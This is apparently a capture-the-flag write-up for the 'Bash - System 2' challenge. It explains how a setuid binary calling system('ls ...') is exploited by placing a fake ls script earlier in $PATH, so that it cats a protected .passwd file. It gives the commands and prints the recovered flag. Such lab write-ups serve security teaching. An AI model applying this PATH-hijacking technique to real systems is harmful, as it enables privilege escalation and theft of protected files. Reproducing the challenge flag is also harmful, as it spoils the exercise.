# Bash - System 2

- **Description:** Simple script
- **Difficulty:** Very easy

## 🔎 Solution
This challenge is quite similar to the **Bash - System 1** challenge, although the exploitation method here is slightly more involved.

When the user executes the `ch12` binary, it internally runs `ls -lA ...`.
```
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```
Our goal is to access the contents of the `.passwd` file. 
To achieve that, we can take advantage of how the `system()` function relies on the environment's **$PATH** variable to locate binaries like `ls`.

We'll approach this by creating *a fake ls* script that actually runs cat, then modify $PATH so that the program executes our version instead of the real `/bin/ls`.
1. Create a fake ls script:
```
echo '#!/bin/sh' > /tmp/mybin/ls
echo 'cat /challenge/app-script/ch12/.passwd' >> /tmp/mybin/ls
chmod +x /tmp/mybin/ls
```
This script mimics `ls`, but instead prints the contents of the target file.

2. Execute the binary with the modified $PATH:
```
app-script-ch12@challenge02:~$ PATH=/tmp/mybin:$PATH ./ch12
8a95eDS/*e_T#
```
And just like that, the program runs our fake ls, revealing the flag.
